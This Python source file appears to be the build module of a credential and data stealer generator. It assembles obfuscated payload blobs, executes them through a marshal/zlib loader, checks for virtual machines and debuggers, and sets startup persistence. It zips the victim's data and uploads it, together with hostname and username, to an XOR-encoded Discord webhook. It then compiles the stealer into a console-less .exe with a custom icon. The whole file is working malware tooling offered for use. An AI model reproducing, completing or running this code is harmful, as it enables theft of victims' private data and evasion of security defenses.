from src.functions.payload_manager import PayloadManager
from src.functions.tools import Tools
from collections import defaultdict
import os, subprocess, shutil


class BuildManager:
    @staticmethod
    def buildImports(selected_payloads: list) -> str:
        grouped_from = defaultdict(set)
        grouped_import = set()

        for method in selected_payloads:
            payload = PayloadManager.getPayload(method)
            reqs = payload.get("requirements", [])

            for req in reqs:
                module = req["module"]
                path = req["path"]
                imp = req["import"]

                if imp is None:
                    if path:
                        grouped_import.add(f"{module}.{'.'.join(path)}")
                    else:
                        grouped_import.add(module)
                else:
                    base = module if not path else f"{module}.{'.'.join(path)}"
                    grouped_from[base].add(imp)

        lines = []

        for base, imports in grouped_from.items():
            imports_str = ", ".join(sorted(imports))
            lines.append(f"from {base} import {imports_str}")

        if grouped_import:
            imports_str = ", ".join(sorted(grouped_import))
            lines.append(f"import {imports_str}")

        final_text = "\n".join(lines)
    
        return final_text

    @staticmethod
    def buildDefaultFunctions(webhook_url: str):
        tempFile = "\ntemp_dir = tempfile.gettempdir()"
        fileName = """\nzip_filename = os.path.join(temp_dir, "SK_"+''.join(random.choices(string.ascii_letters + string.digits, k=16)) + '.zip')"""
        webhook = f'\nwebhook_raw = "{Tools.protect_webhook(webhook_url)}"\n'
        final_text = tempFile + fileName + webhook +'\n'
        return final_text

    @staticmethod
    def buildBlobFunction(selected_payloads: list):
        funcs_blobs = {}

        for method in selected_payloads:
            if method == 'DefaultImports':
                continue
            payload = PayloadManager.getPayload(method)
            name = payload["name"]
            blob = payload.get("blob", "")
            func = payload.get("func", None)

            funcs_blobs[name] = {
                "blob": blob,
                "func": func
            }

        # Gerar texto Python bonitinho
        lines = ["funcs_blobs = {"]

        for name, data in funcs_blobs.items():
            blob_repr = repr(data["blob"])
            func_repr = repr(data["func"])

            lines.append(f'    {name!r}: {{ "blob": {blob_repr}, "func": {func_repr} }},')

        lines.append("}\n")
        
        return lines

    @staticmethod
    def buildStealer(part1, part2, part3):
        C = part1 + part2 + ''.join(part3) + """
class CirqueiraLover:
    @staticmethod
    def de_webhook(webhook: str, chave: str = "CirqueiraAmaOEstadoDeSaoPaulo") -> str:
        data = base64.urlsafe_b64decode(webhook.encode())
        dec_webhook = ''.join(chr(b ^ ord(chave[i % len(chave)])) for i, b in enumerate(data))
        return dec_webhook

    @staticmethod
    def loader(blob: str) -> str:
        b =base64.b64decode(blob)
        b=zlib.decompress(b)
        c=marshal.loads(b)
        return c

    @staticmethod
    def cleanup_file(filename: str) -> bool:
        try:
            if os.path.exists(filename):
                os.remove(filename)
                return True
            else:
                return False
        except PermissionError as e:
            print(e)
            return False
        except Exception as e:
            return False

    @staticmethod
    def send_discord(webhook_url: str, file_path: str) -> bool:
        messages = ["We got him >:D", "I bring good news!", "The rat fell into the trap!", "I have a delivery for you!"]
        content = f"**• {random.choice(messages)}**"

        embed = {
            "title": "• Basic system infos:",
            "color": 0xE53935,
            "fields": [
                {
                    "name": "Hostname:",
                    "value": f"```{socket.gethostname()}```",
                    "inline": True
                },
                {
                    "name": "Username:",
                    "value": f"```{getpass.getuser()}```",
                    "inline": True
                },
                {
                    "name": "Machine:",
                    "value": f"```{platform.machine()}```",
                    "inline": True
                },
                {
                    "name": "System:",
                    "value": f"```{platform.system()}```",
                    "inline": True
                },
                {
                    "name": "Realease:",
                    "value": f"```{platform.release()}```",
                    "inline": True
                },
                {
                    "name": "Version:",
                    "value": f"```{platform.version()}```",
                    "inline": True
                }
            ],
            "footer": {
                "text": "https://github.com/CirqueiraDev | @CirqueiraDev"
            }
        }

        try:
            with open(file_path, "rb") as f:
                files = {"file": (file_path, f)}
                payload = {
                    "content": content,
                    "embeds": [embed]
                }

                r = requests.post(webhook_url, data={"payload_json": json.dumps(payload)}, files=files, timeout=20)
                return r.status_code in (200, 204)
        except:
            return False

    @staticmethod
    def generateFile() -> bool:
        safe = True
        try:
            with zipfile.ZipFile(zip_filename, 'w') as zip_file:
                for name, info in funcs_blobs.items():
                    print(info["func"])
                    exec(CirqueiraLover.loader(info['blob']),globals())
                    func = globals()[info["func"]]
                    if info["func"] == '_is_vm_or_debugged' or info["func"] == '_startup':
                        result = func()
                        if result == True and info["func"] == '_is_vm_or_debugged':
                            print('detected')
                            safe = False
                            return safe
                        else:
                            print('startup:', result)
                    else:
                        result = func(zip_file)
            return safe
        except Exception as e:
            print('failed generate: ', e)
            safe = False
            return safe

if __name__ == '__main__':
    try:
        webhook_url = CirqueiraLover.de_webhook(webhook_raw)
        if CirqueiraLover.generateFile() == True:
            print('not detected or not error')
            CirqueiraLover.send_discord(webhook_url, zip_filename)
        CirqueiraLover.cleanup_file(zip_filename)
    except:
        print('failed main')
        pass
"""
        
        return C

    @staticmethod
    def buildFinal(compress: bool, webhook_url: str, selected_payloads: list, file_name: str, file_type: str, file_icon_path=None, log=None) -> bool:
        def write(msg):
            if log:
                log(msg)

        selected_payloads.append("DefaultImports")

        write("[1/6] Building imports...")
        part1 = BuildManager.buildImports(selected_payloads)

        write("[2/6] Adding default functions...")
        part2 = BuildManager.buildDefaultFunctions(webhook_url)

        write("[3/6] Generating payload blobs...")
        part3 = BuildManager.buildBlobFunction(selected_payloads)

        write("[4/6] Building final stealer code...")
        sk_code = BuildManager.buildStealer(part1, part2, part3)

        write("[5/6] Obfuscating code...")
        protected_code = Tools.obfuscate_code(sk_code, compress)

        warn = "# The requirements inside the payload will still need to be installed; I recommend compiling it into an .exe"
        base_path = file_name
        py_path = base_path + ".py"

        write(f"→ Writing output: {py_path}")
        with open(py_path, "w", encoding="utf-8") as f:
            f.write(warn + '\n' + protected_code)

        if file_type == "py":
            write("✓ Build completed: .py generated successfully.")
            return True

        if file_type == "pyw":
            write("Converting .py → .pyw")
            pyw_path = base_path + ".pyw"
            os.rename(py_path, pyw_path)
            write("✓ Build completed: .pyw generated successfully.")
            return True

        if file_type == "exe":
            write("Converting .py → .pyw")
            pyw_path = base_path + ".pyw"
            exe_path = base_path + ".exe"
            os.rename(py_path, pyw_path)

            write("Running PyInstaller...")

            #write(f"→ Adding {len(part1 + '\n')} imports...")

            with open(pyw_path, "w", encoding="utf-8") as f:
                f.write(part1 + '\n' + '\n' + protected_code)

            cmd = [
                "pyinstaller",
                "--noconfirm",
                "--onefile",
                "--noconsole",
            ]

            if file_icon_path:
                write(f"→ Adding icon: {file_icon_path}")
                cmd.append(f"--icon={file_icon_path}")

            cmd.append(pyw_path)

            write("→ Starting PyInstaller process...")
            try:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )

                # Lê output em tempo real
                for line in process.stdout:
                    line = line.strip()
                    if line:
                        write(f"  {line}")

                process.wait()

                if process.returncode != 0:
                    write(f"✗ PyInstaller failed with code {process.returncode}")
                    return False

            except Exception as e:
                write(f"✗ PyInstaller error: {str(e)}")
                return False

            dist_generated = f"dist/{os.path.basename(base_path)}.exe"

            if os.path.exists(dist_generated):
                write("→ Moving final EXE to output folder...")
                shutil.move(dist_generated, exe_path)
            else:
                write("✗ ERROR: EXE not generated by PyInstaller")
                return False

            write("→ Cleaning temporary files...")
            if os.path.exists(pyw_path): os.remove(pyw_path)
            shutil.rmtree("build", ignore_errors=True)
            shutil.rmtree("dist", ignore_errors=True)

            spec_file = os.path.basename(base_path) + ".spec"
            if os.path.exists(spec_file):
                os.remove(spec_file)

            write("✓ Build completed: EXE generated successfully.")
            return True

        write("✗ ERROR: invalid file_type")

        return False

